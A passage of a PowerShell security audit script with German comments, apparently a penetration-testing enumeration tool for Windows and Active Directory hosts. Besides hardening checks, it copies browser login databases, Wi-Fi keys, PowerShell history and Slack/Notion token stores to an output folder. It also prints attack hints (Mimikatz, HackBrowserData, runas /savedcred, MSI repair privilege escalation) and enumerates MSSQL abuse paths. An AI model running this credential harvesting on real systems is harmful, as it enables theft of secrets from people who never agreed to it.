    if ($dangerousTrustees.Count -gt 0) {
        Write-Host "[P131]   Non-admin principal(s) with Reanimate-Tombstones right" -ForegroundColor DarkRed
        foreach ($t in $dangerousTrustees) {
            Write-Host "          - $t" -ForegroundColor DarkRed
        }
        Write-Host "          - Restore deleted privileged account: Get-ADObject -Filter {isDeleted -eq `$true} -IncludeDeletedObjects | Restore-ADObject" -ForegroundColor DarkGray
    } else {
        Write-Host "[ OK ]   Reanimate-Tombstones right restricted to default principals" -ForegroundColor Green
    }
} catch {
    Write-Host "[ -- ]   Reanimate-Tombstones check failed: $_" -ForegroundColor DarkGray
}

Write-Host ""

# LLMNR
$llmnr = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -ErrorAction SilentlyContinue).EnableMulticast
if ($llmnr -eq 0) {
    Write-Host "[ OK ]   LLMNR is disabled" -ForegroundColor Green
} else {
    Write-Host "[P140]   LLMNR is enabled (Responder poisoning possible)" -ForegroundColor DarkRed
}

# mDNS
try {
    $mDNSProps = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -ErrorAction SilentlyContinue
    $mDNS = $mDNSProps.EnableMDNS
    if ($null -eq $mDNS) {
        # Wert nicht gesetzt = Windows-Default = mDNS aktiv
        Write-Host "[P141]   mDNS is enabled by default (key not set - mDNS Poisoning possible)" -ForegroundColor DarkRed
    } elseif ($mDNS -eq 0) {
        Write-Host "[ OK ]   mDNS is disabled" -ForegroundColor Green
    } else {
        Write-Host "[P141]   mDNS is enabled (mDNS Poisoning possible)" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "[P141]   mDNS status check failed: $_" -ForegroundColor DarkYellow
}

# NetBIOS over TCP/IP
$interfaces = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
$nbEnabled = $interfaces | Where-Object {
    (Get-ItemProperty $_.PSPath).NetbiosOptions -ne 2
}
if ($nbEnabled.Count -eq 0) {
    Write-Host "[ OK ]   NetBIOS over TCP/IP disabled on all interfaces" -ForegroundColor Green
} else {
    Write-Host "[P142]   NetBIOS over TCP/IP enabled on $($nbEnabled.Count) interface(s)" -ForegroundColor DarkRed
}

# Null Session
try {
    $lsa = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -ErrorAction Stop
    $restrictAnon    = $lsa.RestrictAnonymous
    $restrictSAM     = $lsa.RestrictAnonymousSAM
    $everyoneIsAnon  = $lsa.EveryoneIncludesAnonymous

    $nullSessionIssues = @()
    if ($restrictAnon -ne 1)   { $nullSessionIssues += "RestrictAnonymous=$restrictAnon (should be 1)" }
    if ($restrictSAM -ne 1)    { $nullSessionIssues += "RestrictAnonymousSAM=$restrictSAM (should be 1)" }
    if ($everyoneIsAnon -ne 0) { $nullSessionIssues += "EveryoneIncludesAnonymous=$everyoneIsAnon (should be 0)" }

    if ($nullSessionIssues.Count -gt 0) {
        Write-Host "[P143]   Null Session Authentication not fully restricted" -ForegroundColor DarkRed
        foreach ($issue in $nullSessionIssues) {
            Write-Host "          - $issue" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "[ OK ]   Null Session Authentication restricted" -ForegroundColor Green
    }
} catch {
    Write-Host "[ -- ]   Null Session check failed: $_" -ForegroundColor DarkYellow
}

Write-Host ""

# Admins and logged on users
$adminRaw = $null
try {
    $adminSID = "S-1-5-32-544"
    $adminGroupName = (Get-LocalGroup | Where-Object { $_.SID -eq $adminSID }).Name
    $adminRaw = net localgroup $adminGroupName 2>&1
    if ($LASTEXITCODE -ne 0) { $adminRaw = $null }
} catch {}
$adminMembers = $adminRaw | Select-Object -Skip 6 | Where-Object {
    $_ -notmatch "^-+$" -and
    $_ -notmatch "completed successfully|erfolgreich" -and
    $_ -notmatch "^\s*$"
}
$loggedOutput = query user 2>$null
$loggedUsers = $loggedOutput | Select-Object -Skip 1 | Where-Object { $_ -notmatch "^\s*$" } | ForEach-Object {
    $_ -replace "^>", " " -replace "\s+", " "
}
$combined = @()
$combined += "=== LOCAL ADMINS ($adminGroupName) ==="
$combined += $adminMembers
$combined += ""
$combined += "=== LOGGED ON USERS ==="
$combined += $loggedUsers
$combined | Out-File "$OUT\users_and_admins.txt" -Encoding utf8
Write-Host "[ OK ]   Users & Admins -> users_and_admins.txt" -ForegroundColor Green
if ($loggedUsers.Count -gt 1) {
    Write-Host "           - [P145] Multiple users are logged on" -ForegroundColor DarkRed
}

# Default Administrator Account (RID 500)
try {
    $rid500 = Get-LocalUser | Where-Object { $_.SID -match '-500$' }
    if ($rid500.Enabled) {
        Write-Host "[P150]   Default Administrator account (RID 500) is enabled: $($rid500.Name)" -ForegroundColor DarkRed
    } else {
        Write-Host "[ OK ]   Default Administrator account (RID 500) is disabled" -ForegroundColor Green
    }
} catch {
    Write-Host "[ -- ]   Default Administrator account (RID 500) status unknown" -ForegroundColor DarkYellow
}

# DNS Cache
$noisePatterns = 'microsoft\.com|windows\.com|akamai\.|trafficmanager\.net|msn\.com|office\.com|office365\.com|skype\.com|live\.com|bing\.com|msftncsi\.com|msftconnecttest\.com|windowsupdate\.com|github\.com|githubusercontent\.com|akadns\.net|edgesuite\.net|edgekey\.net|akamaiedge\.net|fastly\.net|globalcdn\.co|gcdn\.co|xboxservices\.com|azure\.com|azureedge\.net|smartscreen\.microsoft|digicert\.com|msedge\.net|msidentity\.com|dsp\.mp\.microsoft|delivery\.mp\.microsoft|qwilted-cds\.cqloud\.com'
$dnsRaw = (ipconfig /displaydns) -join "`n"
$blocks = $dnsRaw -split "(?=\n\S[^\n]+\n\s+-{5,})"
$interesting = @()
foreach ($block in $blocks) {
    $firstLine = ($block -split "`n" | Where-Object { $_ -match '\S' } | Select-Object -First 1).Trim()
    if ($firstLine -and $firstLine -notmatch $noisePatterns -and $firstLine -notmatch '^Windows IP|^Record|^No records|^-{3,}|^Section|^Time To|^Data Length|^CNAME|^AAAA|^A \(Host\)|^PTR') {
        $interesting += $block
    }
}
if ($interesting.Count -gt 0) {
    $interesting | Out-File "$OUT\dns_cache.txt" -Encoding utf8
    Write-Host "[P147]   $($interesting.Count) unknown DNS cache entries -> dns_cache.txt" -ForegroundColor DarkRed
} else {
    Write-Host "[ OK ]   DNS cache contains only known domains" -ForegroundColor Green
}

# Scheduled Tasks (filtered)
$allTasks = Get-ScheduledTask
$suspicious = @()
foreach ($task in $allTasks) {
    $path = $task.TaskPath
    $name = $task.TaskName
    $actions = $task.Actions | ForEach-Object { $_.Execute + " " + $_.Arguments }
    $actionStr = $actions -join " "
    $isThirdParty = $path -notmatch '^\\Microsoft\\'
    $isSuspiciousAction = $actionStr -match 'encoded|enc |bypass|hidden|\.vbs|\.js|\.bat|\.cmd|\.ps1|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin' `
        -or ($actionStr -match '%Temp%|%AppData%|%Roaming%|\\Temp\\|\\AppData\\|\\Roaming\\' `
        -and $actionStr -notmatch 'System32|SysWOW64|SystemRoot|ProgramFiles|\\Windows\\')
    if ($isThirdParty -or ($isSuspiciousAction -and $path -notmatch '^\\Microsoft\\')) {
        $suspicious += [PSCustomObject]@{
            Path    = $path
            Name    = $name
            Action  = $actionStr.Trim()
            State   = $task.State
        }
    }
}
if ($suspicious.Count -gt 0) {
    $suspicious | Out-File "$OUT\scheduled_tasks.txt" -Encoding utf8
    Write-Host "[P148]   $($suspicious.Count) suspicious scheduled task(s) -> scheduled_tasks.txt" -ForegroundColor DarkRed
} else {
    Write-Host "[ OK ]   No suspicious scheduled tasks found" -ForegroundColor Green
}

# Startup items (filtered)
$startupOutput = Get-CimInstance Win32_StartupCommand |
    Where-Object { $_.Command -notmatch "SecurityHealthSystray|Windows Defender|MpCmdRun" }
if ($startupOutput) {
    $startupOutput | Out-File "$OUT\startup_items.txt" -Encoding utf8
    Write-Host "[P150]   Startup items found -> startup_items.txt" -ForegroundColor DarkRed
} else {
    Write-Host "[ OK ]   No non-standard startup items found" -ForegroundColor Green
}

# Check WSL
try {
    $wslJob = Start-Job { wsl --list --verbose 2>&1 }
    $wsl = $wslJob | Wait-Job -Timeout 5 | Receive-Job
    Remove-Job $wslJob -Force
    if ($wsl -match "NAME") {
        Write-Host "[P155]   WSL is installed and has distributions" -ForegroundColor DarkRed
        foreach ($line in $wsl) {
            if ($line -match "\S") {
                Write-Host "             $line" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "[ OK ]   WSL is not installed or no distributions" -ForegroundColor Green
    }
} catch {
    Write-Host "[ OK ]   WSL is not installed or no distributions" -ForegroundColor Green
}

# MSI repairing
$paths = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
)
$excludedVendors = @(
    "Python Software Foundation",
    "Parallels International GmbH",
    "HP",
    "Hewlett-Packard"
)
$installer = New-Object -ComObject WindowsInstaller.Installer
$msis = Get-ItemProperty $paths -ErrorAction SilentlyContinue | Where-Object {
    $_.DisplayName -and
    $_.WindowsInstaller -eq 1 -and
    $_.PSChildName -match '^\{[0-9A-F\-]+\}$' -and
    $_.Publisher -notlike 'Microsoft*' -and
    $_.Publisher -notin $excludedVendors
}
$msiResult = foreach ($m in $msis) {
    $guid = $m.PSChildName
    $props = @{}
    foreach ($p in 'InstallSource','LocalPackage','PackageName','Transforms','VersionString') {
        try { $props[$p] = $installer.ProductInfo($guid, $p) }
        catch { $props[$p] = $null }
    }
    $sourceState = 'Empty'
    if ($props.InstallSource) {
        try {
            if (Test-Path $props.InstallSource -ErrorAction SilentlyContinue) {
                $sourceState = 'Exists'
            } else {
                $acl = Get-Acl $props.InstallSource -ErrorAction SilentlyContinue
                $sourceState = if ($null -eq $acl) { 'Missing' } else { 'AccessDenied' }
            }
        } catch {
            $sourceState = 'Error'
        }
    }
    $localWritable = $false
    $localAclText = $null
    if ($props.LocalPackage) {
        try {
            $localAclText = (icacls $props.LocalPackage 2>$null) -join "`n"
            if ($localAclText -match 'Everyone:\(.*[MWF]' -or
                $localAclText -match 'Users:\(.*[MWF]' -or
                $localAclText -match 'Authenticated Users:\(.*[MWF]') {
                $localWritable = $true
            }
        } catch {}
    }
    $transformsWritable = $false
    $transformsAclText = $null
    if ($props.Transforms) {
        try {
            $transformsAclText = (icacls $props.Transforms 2>$null) -join "`n"
            if ($transformsAclText -match 'Everyone:\(.*[MWF]' -or
                $transformsAclText -match 'Users:\(.*[MWF]' -or
                $transformsAclText -match 'Authenticated Users:\(.*[MWF]') {
                $transformsWritable = $true
            }
        } catch {}
    }
    $priority = 'Low'
    if ($props.Transforms)                                { $priority = 'High' }
    elseif ($sourceState -in @('Missing','AccessDenied')) { $priority = 'Medium' }
    if ($localWritable -or $transformsWritable)           { $priority = 'High' }
    [PSCustomObject]@{
        Name               = $m.DisplayName
        Vendor             = $m.Publisher
        GUID               = $guid
        Version            = $props.VersionString
        InstallSource      = $props.InstallSource
        SourceState        = $sourceState
        LocalPackage       = $props.LocalPackage
        PackageName        = $props.PackageName
        Transforms         = $props.Transforms
        LocalWritable      = $localWritable
        LocalACL           = $localAclText
        TransformsWritable = $transformsWritable
        TransformsACL      = $transformsAclText
        Priority           = $priority
    }
}
$sorted = $msiResult | Sort-Object @{Expression='Priority';Descending=$true}, @{Expression='Name';Descending=$false}
if ($sorted) {
    $report = @()
    $report += "[P300] MSI Repair LPE - Kandidaten"
    $report += "===================================="
    $i = 1
    foreach ($item in $sorted) {
        $report += ""
        $report += "[$i] $($item.Name) [$($item.Priority)]"
        $report += "    Vendor             : $($item.Vendor)"
        $report += "    GUID               : $($item.GUID)"
        $report += "    Version            : $($item.Version)"
        $report += "    PackageName        : $($item.PackageName)"
        $report += "    InstallSource      : $($item.InstallSource)"
        $report += "    SourceState        : $($item.SourceState)"
        $report += "    LocalPackage       : $($item.LocalPackage)"
        $report += "    LocalWritable      : $($item.LocalWritable)"
        $report += "    LocalACL           :"
        $item.LocalACL -split "`n" | ForEach-Object { $report += "      $_" }
        $report += "    Transforms         : $($item.Transforms)"
        $report += "    TransformsWritable : $($item.TransformsWritable)"
        $report += "    TransformsACL      :"
        $item.TransformsACL -split "`n" | ForEach-Object { $report += "      $_" }
        $report += "------------------------------------"
        $i++
    }
    $report | Out-File "$OUT\msi_list.txt" -Encoding utf8
    Write-Host "[P300]   MSI repair might be LPE possible -> msi_list.txt" -ForegroundColor DarkRed
    Write-Host '          - msiexec /fa "{GUID from msi_list.txt}"' -ForegroundColor DarkGray
    Write-Host "          - https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" -ForegroundColor DarkGray
} else {
    Write-Host "[ OK ]   No MSI repair LPE vectors found" -ForegroundColor Green
}

Write-Host ""

# RDP connections
try {
    $rdp = cmd /c 'reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" 2>nul'
    if ($rdp -match "MRU") {
        Write-Host "[P460]   RDP saved servers found -> rdp_servers.txt" -ForegroundColor DarkRed
        $rdp | Out-File "$OUT\rdp_servers.txt"
    } else {
        Write-Host "[ OK ]   No saved RDP servers found" -ForegroundColor Green
    }
} catch {
    Write-Host "[ -- ]   RDP enumeration failed" -ForegroundColor DarkYellow
}

# PuTTY sessions
try {
    $putty = cmd /c 'reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>nul'
    if ($putty -match "Sessions") {
        Write-Host "[P470]   PuTTY sessions configured -> putty_sessions.txt" -ForegroundColor DarkRed
        $putty | Out-File "$OUT\putty_sessions.txt"
    } else {
        Write-Host "[ OK ]   No PuTTY sessions found" -ForegroundColor Green
    }
} catch {
    Write-Host "[ -- ]   PuTTY enumeration skipped" -ForegroundColor DarkYellow
}

# DPAPI Artefacts Check
try {
    $dpapi = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
    if ($dpapi -and $dpapi.Count -gt 0) {
        Write-Host "[P500]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
        Write-Host "             - Use SharpDPAPI or Mimikatz for decryption" -ForegroundColor DarkGray
    } else {
        Write-Host "[ OK ]   No DPAPI credentials found" -ForegroundColor Green
    }
} catch {
    Write-Host "[ OK ]   DPAPI check skipped" -ForegroundColor Green
}

# SSH keys
if (Test-Path "$env:USERPROFILE\.ssh") {
    Write-Host "[P550]   SSH keys found -> ssh_keys.txt" -ForegroundColor DarkRed
    Get-ChildItem "$env:USERPROFILE\.ssh" | Out-File "$OUT\ssh_keys.txt"
} else {
    Write-Host "[ OK ]   No SSH keys found" -ForegroundColor Green
}

# Browser creds check
$browserPaths = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
}
$found = @()
foreach ($browser in $browserPaths.Keys) {
    $path = $browserPaths[$browser]
    if ($browser -eq "Firefox") {
        if (Test-Path $path) {
            $profiles = Get-ChildItem $path -Directory -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                $loginFile = "$($profile.FullName)\logins.json"
                if (Test-Path $loginFile) {
                    $found += $browser
                    Copy-Item $loginFile "$OUT\firefox_logins_$($profile.Name).json" -ErrorAction SilentlyContinue
                }
            }
        }
    } else {
        if (Test-Path $path) {
            try {
                $tmpCopy = "$env:TEMP\${browser}_tmp_ld"
                Copy-Item $path $tmpCopy -ErrorAction Stop
                $count = ([regex]::Matches([System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($tmpCopy)), "https?://")).Count
                Remove-Item $tmpCopy -ErrorAction SilentlyContinue
                if ($count -gt 0) {
                    $found += $browser
                    Copy-Item $path "$OUT\${browser}_LoginData" -ErrorAction SilentlyContinue
                }
            } catch {}
        }
    }
}
if ($found.Count -gt 0) {
    Write-Host "[P570]   Browser credential stores found: $($found -join ', ') -> db copied to output" -ForegroundColor DarkRed
    Write-Host "          - Decrypt with HackBrowserData: https://github.com/moonD4rk/HackBrowserData" -ForegroundColor DarkGray
} else {
    Write-Host "[ OK ]   No browser credential stores found" -ForegroundColor Green
}

# Windows Credential Manager
$credmanOutput = cmdkey /list 2>$null
$actionableTargets = $credmanOutput | Where-Object {
    $_ -match "Target:|Ziel:" -and
    $_ -notmatch "MicrosoftAccount|WindowsLive|virtualapp|SSO_POP|didlogical"
}
if ($actionableTargets) {
    $credmanOutput | Where-Object { $_ -notmatch "MicrosoftAccount|WindowsLive|virtualapp|SSO_POP|didlogical" } |
        Out-File "$OUT\credman.txt" -Encoding utf8
    Write-Host "[P571]   Windows Credential Manager entries found -> credman.txt" -ForegroundColor DarkRed
    $rdpCreds = $actionableTargets | Where-Object { $_ -match "TERMSRV" }
    $netCreds = $actionableTargets | Where-Object { $_ -match "Domain|LegacyGeneric" }
    if ($rdpCreds) {
        Write-Host "          - Saved RDP credentials present" -ForegroundColor DarkRed
        Write-Host "          - runas /savedcred /user:<USER> cmd.exe" -ForegroundColor DarkGray
    }
    if ($netCreds) {
        Write-Host "          - Saved network/domain credentials present" -ForegroundColor DarkRed
    }
} else {
    Write-Host "[ OK ]   No actionable Windows Credential Manager entries found" -ForegroundColor Green
}

# Wi-Fi Profiles
$wlanProfiles = netsh wlan show profiles 2>$null
if ($wlanProfiles -match "All User Profile") {
    $profileNames = $wlanProfiles | Where-Object { $_ -match "All User Profile" } | 
        ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifiOut = @()
    foreach ($profile in $profileNames) {
        $detail = netsh wlan show profile name="$profile" key=clear 2>$null
        $wifiOut += $detail
        if ($detail -match "Key Content") {
            $keyLine = ($detail | Where-Object { $_ -match "Key Content" }) -join ""
            Write-Host "[P572]   Wi-Fi profile with cleartext key: $profile" -ForegroundColor DarkRed
            Write-Host "          - $keyLine" -ForegroundColor DarkGray
        }
    }
    $wifiOut | Out-File "$OUT\wifi_profiles.txt" -Encoding utf8
    Write-Host "          - All profiles -> wifi_profiles.txt" -ForegroundColor DarkGray
} else {
    Write-Host "[ OK ]   No Wi-Fi profiles found" -ForegroundColor Green
}

# PowerShell history
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
if (Test-Path $histFile) {
    Copy-Item $histFile "$OUT\powershell_history.txt" -ErrorAction SilentlyContinue
    $sensitive = Select-String -Path $histFile -Pattern "password|passwd|pwd|pass=|api.?key|token|secret|credential|auth|login" -ErrorAction SilentlyContinue
    if ($sensitive) {
        Write-Host "[P580]   Sensitive commands in PowerShell history -> powershell_history.txt" -ForegroundColor DarkRed
    } else {
        Write-Host "[ OK ]   PowerShell history found -> powershell_history.txt" -ForegroundColor Green
    }
} else {
    Write-Host "[ OK ]   No PowerShell history found" -ForegroundColor Green
}

# AI tool storage
$aiTools = @{
    "Glean"    = @(
        "$env:APPDATA\Glean\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Glean\Local Storage\leveldb"
    )
    "eesel"    = @(
        "$env:APPDATA\eesel\Local Storage\leveldb",
        "$env:LOCALAPPDATA\eesel\Local Storage\leveldb"
    )
    "Notion"   = @(
        "$env:APPDATA\Notion\Local Storage\leveldb"
    )
    "Slack"    = @(
        "$env:APPDATA\Slack\Local Storage\leveldb"
    )
}
$foundAI = @()
foreach ($tool in $aiTools.Keys) {
    foreach ($path in $aiTools[$tool]) {
        if (Test-Path $path) {
            $foundAI += $tool
            Copy-Item $path "$OUT\ai_${tool}_storage" -Recurse -ErrorAction SilentlyContinue
            break
        }
    }
}

if ($foundAI.Count -gt 0) {
    Write-Host "[P600]   Enterprise AI tool storage found: $($foundAI -join ', ') -> ai_*_storage" -ForegroundColor DarkRed
    Write-Host "          - Extract tokens from .ldb files: strings *.ldb | grep -i 'token\|bearer\|api'" -ForegroundColor DarkGray
} else {
    Write-Host "[ OK ]   No Enterprise AI tool local storage found" -ForegroundColor Green
}

Write-Host ""

# Screen Lock Timeout
$screenSaverActive = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -ErrorAction SilentlyContinue).ScreenSaveActive
$screenTimeout = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name "ScreenSaveTimeOut" -ErrorAction SilentlyContinue).ScreenSaveTimeOut
$inactivityTimeout = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "InactivityTimeoutSecs" -ErrorAction SilentlyContinue).InactivityTimeoutSecs

if ($inactivityTimeout -and [int]$inactivityTimeout -le 900) {
    Write-Host "[ OK ]   Screen lock timeout enforced via GPO: $([int]$inactivityTimeout / 60) minutes" -ForegroundColor Green
} elseif ($inactivityTimeout -and [int]$inactivityTimeout -gt 900) {
    Write-Host "[P731]   Screen lock GPO timeout too long: $([int]$inactivityTimeout / 60) minutes (>15)" -ForegroundColor DarkRed
} elseif ($screenSaverActive -eq "1" -and $screenTimeout -and [int]$screenTimeout -le 900) {
    Write-Host "[ OK ]   Screen lock timeout: $([int]$screenTimeout / 60) minutes" -ForegroundColor Green
} elseif ($screenSaverActive -eq "1" -and $screenTimeout -and [int]$screenTimeout -gt 900) {
    Write-Host "[P731]   Screen lock timeout too long: $([int]$screenTimeout / 60) minutes (>15)" -ForegroundColor DarkRed
} else {
    Write-Host "[P730]   Screen lock timeout not set" -ForegroundColor DarkRed
}

# Office Macro Policy
$officeVersions = Get-ChildItem "HKCU:\Software\Microsoft\Office" -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match '\\[\d]+\.[\d]+$' } |
    Select-Object -ExpandProperty PSChildName
$macroApps = @("Word", "Excel", "PowerPoint", "Access")
$macroFindings = @()
foreach ($version in $officeVersions) {
    foreach ($app in $macroApps) {
        $path = "HKCU:\Software\Microsoft\Office\$version\$app\Security"
        if (Test-Path $path) {
            $val = (Get-ItemProperty $path -Name "VBAWarnings" -ErrorAction SilentlyContinue).VBAWarnings
            if ($val -eq 1 -or $null -eq $val) {
                $macroFindings += "$app ($version)"
            }
        }
    }
}
if ($macroFindings.Count -gt 0) {
    Write-Host "[P755] Office Macros unrestricted in: $($macroFindings -join ', ')" -ForegroundColor DarkRed
} else {
    Write-Host "[ OK ]   Office Macro execution restricted" -ForegroundColor Green
}

Write-Host ""

# MSSQL Enum
function sql-Q {
    param([string]$I, [string]$Q, [string]$D = "master")
    try {
        $c = New-Object System.Data.SqlClient.SqlConnection "Server=$I;Database=$D;Integrated Security=SSPI;Connect Timeout=5;Encrypt=False;TrustServerCertificate=True;"
        $c.Open(); $cmd = $c.CreateCommand(); $cmd.CommandText = $Q; $cmd.CommandTimeout = 5
        $da = New-Object System.Data.SqlClient.SqlDataAdapter $cmd
        $ds = New-Object System.Data.DataSet; $null = $da.Fill($ds); $c.Close()
        if ($ds.Tables.Count -gt 0 -and $ds.Tables[0].Rows.Count -gt 0) { return ,$ds.Tables[0] }
    } catch { }
    return $null
}
function sql-X {
    param([string]$I, [string]$Q, [string]$D = "master")
    try {
        $c = New-Object System.Data.SqlClient.SqlConnection "Server=$I;Database=$D;Integrated Security=SSPI;Connect Timeout=5;Encrypt=False;TrustServerCertificate=True;"
        $c.Open(); $cmd = $c.CreateCommand(); $cmd.CommandText = $Q; $cmd.CommandTimeout = 5
        $null = $cmd.ExecuteNonQuery(); $c.Close(); return $true
    } catch { return $false }
}

# MSSQL Checks
$sqlTargets = [System.Collections.Generic.List[string]]::new()
try {
    $root = [System.DirectoryServices.DirectoryEntry]""
    $sr = New-Object System.DirectoryServices.DirectorySearcher $root
    $sr.Filter = "(servicePrincipalName=MSSQLSvc*)"; $sr.PageSize = 1000
    $sr.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
    foreach ($r in $sr.FindAll()) {
        foreach ($spn in $r.Properties["servicePrincipalName"]) {
            if ($spn -like "MSSQLSvc/*") {
                $body = $spn -replace "^MSSQLSvc/",""; $parts = $body -split ":"
                $inst = if ($parts.Count -gt 1 -and $parts[1] -match "^\d+$") { "$($parts[0]),$($parts[1])" }
                        elseif ($parts.Count -gt 1) { "$($parts[0])\$($parts[1])" }
                        else { $parts[0] }
                if ($inst -notin $sqlTargets) { $sqlTargets.Add($inst) }
            }
        }
    }
} catch { }
try {
    $reg = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction Stop
    foreach ($i in $reg.InstalledInstances) {
        $inst = if ($i -eq "MSSQLSERVER") { $env:COMPUTERNAME } else { "$env:COMPUTERNAME\$i" }
        if ($inst -notin $sqlTargets) { $sqlTargets.Add($inst) }
    }
} catch { }
try {
    $wmiInst = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -like "MSSQL*" } | Select-Object -ExpandProperty Name
    foreach ($i in $wmiInst) { if ($i -notin $sqlTargets) { $sqlTargets.Add($i) } }
} catch { }
if ($sqlTargets.Count -eq 0) {
    Write-Host "[ OK ]   No MSSQL instances discovered" -ForegroundColor Green
} else {
    $sqlGood = [System.Collections.Generic.List[string]]::new()
    $sqlSb = { param($i); try { $c = New-Object System.Data.SqlClient.SqlConnection "Server=$i;Database=master;Integrated Security=SSPI;Connect Timeout=5;Encrypt=False;TrustServerCertificate=True;"; $c.Open(); $c.Close(); return $i } catch { return $null } }
    $sqlJobs = @()
    foreach ($i in $sqlTargets) {
        while (($sqlJobs | Where-Object { $_.State -eq "Running" }).Count -ge 10) { Start-Sleep -Milliseconds 150 }
        $sqlJobs += Start-Job -ScriptBlock $sqlSb -ArgumentList $i
    }
    foreach ($j in $sqlJobs) { $r = Receive-Job $j -Wait -AutoRemoveJob; if ($r) { $sqlGood.Add($r) } }
    if ($sqlGood.Count -eq 0) {
        Write-Host "[ -- ]   MSSQL instances found but none accessible as current user" -ForegroundColor DarkGray
        foreach ($t in $sqlTargets) { Write-Host "          - $t" -ForegroundColor DarkGray }
    } else {
        $mssqlLog = "$OUT\mssql_enum.txt"
        $mssqlOut = [System.Collections.Generic.List[string]]::new()
        foreach ($inst in $sqlGood) {
            $mssqlOut.Add("================================================================")
            $mssqlOut.Add(" $inst")
            $mssqlOut.Add("================================================================")
            $q = sql-Q $inst ("SELECT @@SERVERNAME AS Name, SERVERPROPERTY('ProductVersion') AS Version, SERVERPROPERTY('Edition') AS Edition, SERVERPROPERTY('IsIntegratedSecurityOnly') AS WinAuthOnly, SYSTEM_USER AS Login, IS_SRVROLEMEMBER('sysadmin') AS IsSA")
            if ($q) {
                $r = $q.Rows[0]
                $mssqlOut.Add("Name    : $($r.Name)")
                $mssqlOut.Add("Version : $($r.Version) -- $($r.Edition)")
                $mssqlOut.Add("AuthMode: $(if ($r.WinAuthOnly -eq 1) { 'Windows Only' } else { 'Mixed (SQL+Windows)' })")
                $mssqlOut.Add("Login   : $($r.Login) | sysadmin=$($r.IsSA)")
                $currentLogin = "$($r.Login)"
                $isSA = $r.IsSA
                if ($r.WinAuthOnly -eq 0) { $mssqlOut.Add("[P801]   Mixed Authentication Mode enabled") }
            }

            # Logins
            $mssqlOut.Add(""); $mssqlOut.Add("--- Logins ---")
            $q = sql-Q $inst ("SELECT sp.name AS Login, sp.type_desc AS Type, sp.is_disabled AS Disabled, IS_SRVROLEMEMBER('sysadmin', sp.name) AS SA FROM sys.server_principals sp WHERE sp.type IN ('S','U','G') AND sp.name NOT LIKE '##%' ORDER BY SA DESC, sp.name")
            if ($q) { $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String)) }

            # Databases
            $mssqlOut.Add("--- Databases ---")
            $q = sql-Q $inst ("SELECT name AS DB, is_trustworthy_on AS Trustworthy, SUSER_SNAME(owner_sid) AS Owner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) AS OwnerSA, HAS_DBACCESS(name) AS HasAccess FROM sys.databases ORDER BY Trustworthy DESC, name")
            if ($q) {
                $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
                foreach ($r in $q.Rows) {
                    if ($r.Trustworthy -eq $true -and $r.DB -ne "msdb") { $mssqlOut.Add("[P802]   TRUSTWORTHY: $($r.DB) (Owner: $($r.Owner), OwnerSA=$($r.OwnerSA))") }
                }
            }

            # Dangerous config
            $mssqlOut.Add("--- Configuration ---")
            $q = sql-Q $inst ("SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled','Ad Hoc Distributed Queries','cross db ownership chaining')")
            if ($q) {
                $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
                foreach ($r in $q.Rows) { if ($r.value_in_use -eq 1) { $mssqlOut.Add("[P803]   ENABLED: $($r.name)") } }
            }

            # Impersonation
            $mssqlOut.Add("--- IMPERSONATE Permissions ---")
            $q = sql-Q $inst ("SELECT grantee.name AS Grantee, target.name AS Target, IS_SRVROLEMEMBER('sysadmin', target.name) AS TargetSA FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON p.major_id = target.principal_id WHERE p.permission_name = 'IMPERSONATE'")
            if ($q -and $q.Rows.Count -gt 0) {
                $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
                foreach ($r in $q.Rows) { $mssqlOut.Add("[P804]   IMPERSONATE: $($r.Grantee) -> $($r.Target) (SA=$($r.TargetSA))") }
            } else { $mssqlOut.Add("None found.") }

            # Linked servers
            $mssqlOut.Add("--- Linked Servers ---")
